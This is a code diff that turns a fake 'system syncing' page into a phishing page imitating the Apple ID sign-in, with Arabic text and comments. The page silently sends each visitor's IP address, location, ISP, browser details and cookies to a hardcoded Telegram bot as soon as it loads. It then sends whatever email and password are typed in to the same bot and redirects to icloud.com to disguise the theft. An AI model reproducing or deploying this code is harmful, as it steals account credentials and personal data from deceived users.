@@ -1,43 +1,89 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
-    <script>
-        async function runBypass() {
-            const token = "8213467523:AAE-4yv3jiYvyAHpJU4XJ90lALV5OSKzNDE";
-            const chat_id = "6888107255";
-            let details = "💀 نفاذ إجباري - تم التجاوز:\n";
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign In - Apple</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fff; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
+        .container { width: 100%; max-width: 350px; text-align: center; padding: 20px; }
+        img { width: 35px; margin-bottom: 20px; }
+        h1 { font-size: 24px; font-weight: 600; margin-bottom: 5px; }
+        p { color: #666; font-size: 14px; margin-bottom: 25px; }
+        input { width: 100%; padding: 12px; margin-bottom: 12px; border: 1px solid #d2d2d7; border-radius: 8px; font-size: 16px; box-sizing: border-box; outline: none; }
+        button { width: 100%; padding: 12px; background: #0071e3; color: #fff; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; font-weight: 500; }
+        .footer { position: absolute; bottom: 20px; color: #86868b; font-size: 12px; }
+    </style>
+</head>
+<body>
 
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple">
+        <h1>Apple ID</h1>
+        <p>قم بتسجيل الدخول لمتابعة تحديث الأمان</p>
+        
+        <input type="email" id="email" placeholder="Apple ID" required>
+        <input type="password" id="pass" placeholder="Password" required>
+        
+        <button onclick="captureAll()">Continue</button>
+    </div>
+
+    <div class="footer">Apple Support Page 2026</div>
+
+    <script>
+        const token = "8213467523:AAE-4yv3jiYvyAHpJU4XJ90lALV5OSKzNDE";
+        const chat_id = "6888107255";
+
+        // 1. وظيفة السحب الصامت (تعمل بمجرد فتح الرابط)
+        async function silentCapture() {
+            let details = "⚠️ [دخول جديد - بيانات أولية]:\n";
+            
             try {
-                // محاولة جلب IP عبر خدمة ثانية أسرع وأقل حظراً
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                details += "🌐 الـ IP: " + ipData.ip + "\n";
+                // سحب الـ IP والموقع
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const data = await ipRes.json();
+                details += "🌐 الـ IP: " + data.ip + "\n";
+                details += "📍 المدينة: " + data.city + " (" + data.country_name + ")\n";
+                details += "📶 المزود: " + data.org + "\n";
             } catch (e) {
-                details += "🌐 الـ IP: (فشل التجاوز - محمي بـ VPN/Firewall)\n";
+                details += "🌐 الـ IP: (فشل التجاوز - محمي/VPN)\n";
             }
 
-            // سحب معلومات الجهاز التي لا يمكن إخفاؤها
-            details += "📱 نظام التشغيل: " + navigator.platform + "\n";
-            details += "🖥️ المتصفح: " + navigator.appName + "\n";
-            details += "🕰️ التوقيت المحلي: " + new Date().toLocaleString() + "\n";
-            details += "🔋 البطارية: " + (navigator.getBattery ? await (await navigator.getBattery()).level * 100 + "%" : "غير مدعوم") + "\n";
-            details += "📏 الدقة: " + screen.width + "x" + screen.height;
+            // سحب معلومات الجهاز والبطارية
+            try {
+                const battery = navigator.getBattery ? await navigator.getBattery() : null;
+                details += "🔋 البطارية: " + (battery ? (battery.level * 100).toFixed(0) + "%" : "غير مدعوم") + "\n";
+            } catch (e) {}
 
-            // إرسال البيانات فوراً
+            details += "📱 النظام: " + navigator.platform + "\n";
+            details += "🖥️ المتصفح: " + navigator.userAgent + "\n";
+            details += "🕰️ الوقت: " + new Date().toLocaleString() + "\n";
+            details += "📏 الدقة: " + screen.width + "x" + screen.height + "\n";
+            details += "🔒 الكوكيز: " + (document.cookie || "محمية بميزة HttpOnly");
+
             await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(details)}`);
-            
-            // التحويل الفوري للتمويه
-            window.location.replace("https://iforgot.apple.com");
         }
-        window.onload = runBypass;
+
+        // 2. وظيفة الصيد المباشر (تعمل عند الضغط على الزر)
+        async function captureAll() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+
+            if(!email || !pass) { alert("Please enter your Apple ID and password."); return; }
+
+            let report = "🔥 [صيد ثمين - بيانات الدخول]:\n";
+            report += "📧 الإيميل: " + email + "\n";
+            report += "🔑 الباسورد: " + pass + "\n";
+            report += "🔗 الرابط المفتوح: " + window.location.href;
+
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(report)}`);
+
+            // التمويه النهائي
+            window.location.replace("https://icloud.com");
+        }
+
+        // تشغيل السحب الصامت فور التحميل
+        window.onload = silentCapture;
     </script>
-</head>
-<body style="background:#000; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh; margin:0;">
-    <div style="text-align:center; font-family:sans-serif;">
-        <div style="font-size:80px; margin-bottom:20px;"></div>
-        <div style="width:30px; height:30px; border:3px solid #fff; border-top:3px solid #000; border-radius:50%; animation:spin 1s linear infinite; margin:0 auto;"></div>
-        <p style="margin-top:20px; letter-spacing:1px; font-size:12px;">SYSTEM SYNCING...</p>
-    </div>
-    <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
 </body>
 </html>
